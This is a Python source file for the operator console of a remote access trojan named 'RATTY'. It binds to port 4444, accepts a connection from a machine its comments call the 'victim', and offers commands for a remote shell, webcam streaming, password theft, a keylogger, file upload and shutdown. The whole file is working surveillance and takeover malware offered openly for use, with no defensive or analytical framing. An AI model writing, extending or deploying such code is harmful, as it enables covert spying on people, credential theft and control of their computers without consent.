import socket, subprocess
from pyfiglet import Figlet


class SERVER:
    # initialize the server
    def __init__(self, host, port):
        self.host = host
        self.port = port
    # building the connection with the client using socket
    
    def connection(self):
        # setting global variables to use for the connection and subsequent functions.
        global client, addr, sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # providing host and port to bind the connection
        sock.bind((self.host, self.port))
        # marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept()
        sock.listen(5)
        print('Establishing connection with the client')
        # accepting the connection and setting client and addr variable values to the connection values
        client, addr = sock.accept()
        print('Accepting connection with client...')
        # decoding ipv4 to print the connection IP address
        clientip = client.recv(1024).decode()
        print(f'Connection established with {clientip}')
        
    # setting up function for webcam accessability for later use
    def vidstream_server(self):
        try:
            from vidstream import StreamingServer
            global server
            # giving the vidstream server the attacking machine as the host and setting the port to 8080
            server = StreamingServer(self.host, 8080)
            # starting the vidstream server
            server.start_server()
        except:
            print("Vidstream module not installed")
            
    # function to stop the vidstream server       
    def stop_vidstream(self):
        server.stop_vidstream()
    
    # handling user input for the commands later on in the program. Needed to be encoded
    def send_data(self):
        client.send(command.encode())
        data_output = client.recv(1024).decode()
        print(data_output)
        
    # logo for the RAT
    def rattylogo(self):
        f = Figlet(font='isometric2')
        print(f.renderText('RATTY'))
        print('\n \n ====================================================================== \n \n \n \n Welcome to RATTY, your neighborhood remote administraion tool \n \n')
        
    # prompts given to the user to run commands in the cli    
    def prompts(self):
        print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n keyloggeron                   turns on keylogger \n keyloggeroff                  turns off keylogger \n upload <file>                 uploads file \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
        
    def mainloop(self):
        self.rattylogo()
        self.prompts()
        while True:
            global command
            command = input('RATTY >>> ')
            
            match command:
                case 'shell':
                    client.send(command.encode())
                    while True:
                        command = str(input('$ '))
                        client.send(command.encode())
                        if command == 'exit':
                            break
                        data_output = client.recv(1024).decode()
                        print(data_output)

                case 'gimmiepw':
                    client.send(command.encode())
                    username = str(input('What is the username? '))
                    client.send(username.encode())
                    out = client.recv(2147483647).decode()
                    print(out)
                
                case 'webcam':
                    client.send(command.encode('utf-8'))
                    self.vidstream_server()
                
                case 'monitoron':
                    self.send_data()
                
                case 'monitoroff':
                    self.send_data()
                
                case 'webcamoff':
                    self.stop_vidstream()
            
                case 'upload':
                    client.send(command.encode())
                    file = str(input("Enter the filepath to the file: "))
                    filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                    data = open(file, 'rb')
                    filedata = data.read(2147483647)
                    client.send(filename.encode())
                    print("SENT")
                    client.send(filedata)
            
                case 'help':
                    self.prompts()
                
                case 'exit':
                    f = Figlet(font='isometric2')
                    print(f.renderText('BYE'))
                    client.send(command.encode())
                    out = client.recv(1024)
                    out = out.decode()
                    print(out)
                    sock.close()
                    client.close()    

# setting host port and ip to construct with the server class
rat = SERVER('0.0.0.0', 4444)



if __name__ == '__main__':
    rat.connection()
    rat.mainloop()